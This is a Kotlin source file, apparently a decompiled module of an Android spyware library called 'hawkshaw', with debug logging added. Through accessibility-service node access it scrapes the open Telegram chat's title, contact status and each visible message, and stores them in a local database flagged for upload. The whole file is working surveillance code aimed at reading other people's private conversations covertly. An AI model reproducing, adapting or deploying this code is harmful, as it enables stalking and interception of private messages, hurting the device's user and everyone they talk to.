package com.hawkshaw.library.features.accessibility.socialmedia

import android.util.Log // Added for logging
import android.view.accessibility.AccessibilityNodeInfo
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findBy
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.getChildSafe
import com.hawkshaw.library.ktextensions.getEmpty
import com.hawkshaw.library.ktextensions.hash
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.ExecutorService

// Added a TAG for logging
private const val TAG = "Telegram_DEBUG"

/**
 * Handler for extracting messages from Telegram
 */
object Telegram {

    /**
     * Process a lambda for extracting messages and inserting the entity
     */
    private fun extractMessagesLambda(entity: UnprocessedSocialMediaEntity) {
        Log.d(TAG, "extractMessagesLambda called for entity ID: ${entity.id}, Title: '${entity.title}'")
        CoroutineScope(Dispatchers.IO).launch {
            Log.d(TAG, "extractMessagesLambda: Coroutine launched. Calling HandlerKt.insert for entity ID: ${entity.id}")
            HandlerKt.insert(entity)
            Log.d(TAG, "extractMessagesLambda: HandlerKt.insert likely completed for entity ID: ${entity.id}")
        }
    }

    /**
     * Extract messages from Telegram
     *
     * @param node The accessibility node containing Telegram UI
     * @param executor Executor service to process entities asynchronously
     */
    fun extractMessages(node: AccessibilityNodeInfo, executor: ExecutorService) {
        Log.d(TAG, "extractMessages called. Node: ${node.className}, Executor: $executor")

        // Find the toolbar (action bar)
        val toolbar = node.findBy(toolbarPredicate)
        Log.d(TAG, "extractMessages: Toolbar node found: ${toolbar != null}, className: ${toolbar?.className}")

        // Get parent and title container
        val parent = toolbar?.parent
        Log.d(TAG, "extractMessages: Toolbar's parent node found: ${parent != null}, className: ${parent?.className}")
        val titleContainer = parent?.getChildSafe(1)
        Log.d(TAG, "extractMessages: Title container node found: ${titleContainer != null}, className: ${titleContainer?.className}")

        if (toolbar == null || parent == null || titleContainer == null) {
            Researcher.print("no toolbar")
            return
        }

        // Get title and subtitle from the conversation
        val titleNode = titleContainer.getChildSafe(1)
        val title = titleNode?.text
        Log.d(TAG, "extractMessages: TitleNode found: ${titleNode != null}, Extracted Title: '$title'")

        if (title == null) {
            Researcher.print("no title")
            return
        }

        // Get status (online/offline) from the conversation
        val statusNode = titleContainer.getChildSafe(2)
        val status = statusNode?.text
        Log.d(TAG, "extractMessages: StatusNode found: ${statusNode != null}, Extracted Status: '$status'")

        // Find the recycler view containing messages
        val recyclerView = node.findBy(recyclerViewPredicate)
        Log.d(TAG, "extractMessages: RecyclerView node found: ${recyclerView != null}, className: ${recyclerView?.className}, childCount: ${recyclerView?.childCount}")

        if (recyclerView == null) {
            Researcher.print("no recycler view")
            return
        }

        // Iterate through all children of the recycler view
        Log.d(TAG, "extractMessages: Iterating through ${recyclerView.childCount} children of RecyclerView.")
        for (i in 0 until recyclerView.childCount) {
            Log.v(TAG, "extractMessages: Processing RecyclerView child at index $i")
            val messageNode = recyclerView.getChild(i)
            if (messageNode == null) {
                Log.w(TAG, "extractMessages: Message node at index $i is null. Skipping.")
                continue
            }
            Log.v(TAG, "extractMessages: MessageNode (index $i): className=${messageNode.className}")

            val messageText = messageNode.text
            if (messageText == null) {
                Log.w(TAG, "extractMessages: Message text is null for node at index $i. Skipping.")
                messageNode.recycle() // Recycle the current message node
                continue
            }
            Log.i(TAG, "extractMessages: Extracted MessageText (index $i): '${messageText.toString().take(50)}...'")


            // Skip empty messages
            if (messageText.isEmpty()) {
                Log.d(TAG, "extractMessages: Message text at index $i is empty. Skipping.")
                messageNode.recycle() // Recycle the current message node
                continue
            }

            // Create a unique identifier for this message
            val identifier = "$title-$messageText-${PackageName.TELEGRAM}"
            val id = identifier.hash()
            Log.d(TAG, "extractMessages: Message (index $i) - Identifier: '${identifier.take(70)}...', ID: $id")

            // Create the entity to store in the database
            val entity = UnprocessedSocialMediaEntity(
                id = id,
                title = title.getEmpty(),
                status = status.getEmpty(),
                sender = null,
                message = messageText.getEmpty(),
                type = SocialMediaEntity.Type.Unknown,
                application = PackageName.TELEGRAM,
                timeString = "",
                uploaded = false
            )
            Log.i(TAG, "extractMessages: Created UnprocessedSocialMediaEntity (index $i): ID=${entity.id}, Title='${entity.title}', Msg Snippet='${entity.message.take(50)}...'")

            // Process the entity asynchronously
            Log.d(TAG, "extractMessages: Submitting entity ID ${entity.id} (index $i) to executor.")
            executor.execute { extractMessagesLambda(entity) }
            messageNode.recycle() // Recycle the message node after processing
        }
    }

    // Predicate to find toolbar (companion object in the M1.b class)
    private val toolbarPredicate: (AccessibilityNodeInfo) -> Boolean = { node ->
        val className = node.className?.toString()
        val check = className?.contains("Toolbar") == true
        Log.v(TAG, "toolbarPredicate: Checking node: $className, Result: $check")
        check
    }

    // Predicate to find recycler view (companion object in the M1.b class)
    private val recyclerViewPredicate: (AccessibilityNodeInfo) -> Boolean = { node ->
        val className = node.className?.toString()
        val check = className?.contains("RecyclerView") == true
        Log.v(TAG, "recyclerViewPredicate: Checking node: $className, Result: $check")
        check
    }
}
